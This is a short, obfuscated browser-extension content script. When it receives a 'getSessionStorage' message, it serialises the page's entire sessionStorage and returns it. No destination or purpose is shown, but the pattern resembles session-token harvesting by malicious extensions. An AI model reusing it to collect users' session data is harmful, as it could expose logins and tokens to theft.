console.log("Script content loaded");
chrome.runtime.onMessage.addListener(function (_0x54e37a, _0x4e1ec2, _0x27a25a) {
  console.log("Received message content in script:", _0x54e37a);
  if (_0x54e37a.action === "getSessionStorage") {
    const _0x25467e = JSON.stringify(sessionStorage);
    _0x27a25a({
      'data': _0x25467e
    });
  }
});
chrome.runtime.onInstalled.addListener(() => {
  console.log("Background.js running");
});